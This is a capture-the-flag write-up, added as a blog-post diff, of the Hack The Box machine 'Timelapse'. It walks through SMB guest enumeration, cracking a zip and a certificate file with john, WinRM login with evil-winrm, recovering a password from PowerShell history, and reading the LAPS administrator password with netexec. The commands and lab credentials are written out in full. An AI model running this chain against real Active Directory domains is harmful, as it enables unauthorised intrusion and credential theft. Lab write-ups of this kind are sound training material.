@@ -1,0 +1,227 @@
+---
+title: HTB - Timelapse (Easy)
+date: '2025-07-15'
+tags: ['machine', 'windows', 'Active Directory', 'LAPS', 'pfx2john', 'SSL', 'ReadLAPSPassword']
+draft: false
+summary: Guest logon enumeration was allowed that lead to a zip and pfx file that was crackable by John, giving user access and then discovering Powershell history commands that lead to mapping DACLs hinting at LAPS being enabled. This also lead to reading the DA password in plaintext
+---
+
+<TOCInline toc={props.toc} asDisclosure />
+
+## Scanning
+
+```
+❯ nmap -sV -sC -v -Pn 10.129.233.112
+
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-15 02:40 +08
+NSE: Loaded 156 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 02:40
+Completed NSE at 02:40, 0.00s elapsed
+Initiating NSE at 02:40
+Completed NSE at 02:40, 0.00s elapsed
+Initiating NSE at 02:40
+Completed NSE at 02:40, 0.00s elapsed
+Initiating Parallel DNS resolution of 1 host. at 02:40
+Completed Parallel DNS resolution of 1 host. at 02:40, 0.01s elapsed
+Initiating Connect Scan at 02:40
+Scanning 10.129.233.112 [1000 ports]
+Discovered open port 139/tcp on 10.129.233.112
+Discovered open port 53/tcp on 10.129.233.112
+Discovered open port 135/tcp on 10.129.233.112
+Discovered open port 445/tcp on 10.129.233.112
+Discovered open port 3268/tcp on 10.129.233.112
+Discovered open port 389/tcp on 10.129.233.112
+Discovered open port 593/tcp on 10.129.233.112
+Discovered open port 88/tcp on 10.129.233.112
+Discovered open port 636/tcp on 10.129.233.112
+Discovered open port 3269/tcp on 10.129.233.112
+Discovered open port 464/tcp on 10.129.233.112
+Completed Connect Scan at 02:40, 4.54s elapsed (1000 total ports)
+Initiating Service scan at 02:40
+Scanning 11 services on 10.129.233.112
+Completed Service scan at 02:40, 9.60s elapsed (11 services on 1 host)
+NSE: Script scanning 10.129.233.112.
+Initiating NSE at 02:40
+Completed NSE at 02:41, 40.09s elapsed
+Initiating NSE at 02:41
+Completed NSE at 02:41, 0.46s elapsed
+Initiating NSE at 02:41
+Completed NSE at 02:41, 0.00s elapsed
+Nmap scan report for 10.129.233.112
+Host is up (0.018s latency).
+Not shown: 989 filtered tcp ports (no-response)
+PORT     STATE SERVICE           VERSION
+53/tcp   open  domain            Simple DNS Plus
+88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-07-15 02:40:54Z)
+135/tcp  open  msrpc             Microsoft Windows RPC
+139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
+389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ldapssl?
+3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
+3269/tcp open  globalcatLDAPssl?
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2025-07-15T02:40:59
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+|_clock-skew: 7h59m58s
+
+NSE: Script Post-scanning.
+Initiating NSE at 02:41
+Completed NSE at 02:41, 0.00s elapsed
+Initiating NSE at 02:41
+Completed NSE at 02:41, 0.00s elapsed
+Initiating NSE at 02:41
+Completed NSE at 02:41, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 54.98 seconds
+```
+---
+
+## Enumeration
+
+Guest logon is enabled, let's try enumerate shares
+
+![Description](/static/images/htb/windows/timelapse/1.jpg)
+
+```
+❯ smbclient -L timelapse.htb -U a%
+```
+
+![Description](/static/images/htb/windows/timelapse/2.jpg)
+
+We can see a non-default share called `Shares`. Listing that reveals a few files
+
+![Description](/static/images/htb/windows/timelapse/3.jpg)
+
+Some of them are an installer and guide and specification on setting up LAPS. This may be
+hinting that the target server domain uses LAPS
+
+>[!TIP]
+> Local Administrator Password Solution (LAPS) is a tool used for managing a system where
+> administrator-passwords, which are unique, randomized and frequently changed are applied
+> domain-joined computers
+
+Another interesting file is the zip file called `winrm-backup` which maybe has credentials that
+allows us to WinRM to the target. 
+
+Attempting to unzip it will prompt us for a password to unlock a `.pfx` file which is a bianry file that contains a
+certificate (public key), private key and a certificate chain
+
+![Description](/static/images/htb/windows/timelapse/4.jpg)
+
+---
+
+## Cracking
+
+After much enumeration that leads to nowhere, I decided to bruteforce the password of the zip file using `zip2john`
+
+```
+❯ zip2john winrm_backup.zip > hash.txt                                 
+❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+```
+
+![Description](/static/images/htb/windows/timelapse/5.jpg)
+
+Great now we have the `legacyy_dev_auth.pfx` file. Now the thing with `.pfx` or `pkcs12` files is that they are password-protected unlike `.pem` files
+
+I found this neat tool, pfx2john which is basically what it sounds like xD, means we can also bruteforce the `.pfx` file password
+
+```
+❯ pfx2john legacyy_dev_auth.pfx > pfx_hash.txt
+❯ john --wordlist=/usr/share/wordlists/rockyou.txt pfx_hash.txt
+```
+
+![Description](/static/images/htb/windows/timelapse/6.jpg)
+
+---
+
+## Gaining Access
+
+Nice, now we also have the password of the `.pfx` file, another thing I also learned is we can use this file
+to have an SSL WinRM session on the target! but first, we need to split the `.pfx` file into `.pem` and `.crt`.
+
+```
+❯ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
+❯ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.crt -nodes
+```
+
+Then, we supply them as arguments into `evil-winrm` but we need to also specify `-S` argument because we are authenticating over SSL
+
+```
+❯ evil-winrm -i timelapse.htb -S -k key.pem -c cert.crt
+```
+
+![Description](/static/images/htb/windows/timelapse/7.jpg)
+
+---
+
+## Privilege Escalation
+
+I uploaded and ran Winpeas and saw some interesting stuff like this Powershell history file being present
+
+![Description](/static/images/htb/windows/timelapse/8.jpg)
+
+Concatenating the file reveals past Powershell commands that were ran on the target. We can see here that
+it reveals the password of the user `svc_deploy`. 
+
+![Description](/static/images/htb/windows/timelapse/9.jpg)
+
+Let us verify the credentials
+
+![Description](/static/images/htb/windows/timelapse/10.jpg)
+
+Yep, its correct. Now we can run Bloodhound to map some potential DACLs
+
+```
+❯ nxc ldap timelapse.htb -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' --dns-server 10.129.233.112 --bloodhound --collection All
+```
+
+![Description](/static/images/htb/windows/timelapse/12.jpg)
+
+Looking at Bloodhound, we can see `svc_deploy` is a member of the  `Laps_Readers` group that has a `ReadLAPSPassword` Edge.
+This means we can use his credentials to read the password of `Administrator`
+
+Luckily, Netexec has a command option that helps us with this
+
+```
+❯ nxc smb timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' --laps
+```
+
+![Description](/static/images/htb/windows/timelapse/13.jpg)
+
+Boom! just like that we have `Administrator`'s credentials, let us verify this
+
+![Description](/static/images/htb/windows/timelapse/14.jpg)
+
+Yes, it is correct. We can proceed to WinRM with the SSL option
+
+```
+❯ evil-winrm -i timelapse.htb -u administrator -p '@-u{P+{oYZ[C9g%}S1!%XP}m' -S
+```
+
+![Description](/static/images/htb/windows/timelapse/15.jpg)
+
+Whas was weird was the root flag was nowhere to be seen. This was a first xD. So i went to look at the Users and saw
+mr `TRX` over here
+
+![Description](/static/images/htb/windows/timelapse/16.jpg)
+
+And the root flag was there!
+
+![Description](/static/images/htb/windows/timelapse/17.jpg)
+
+
+
+
+
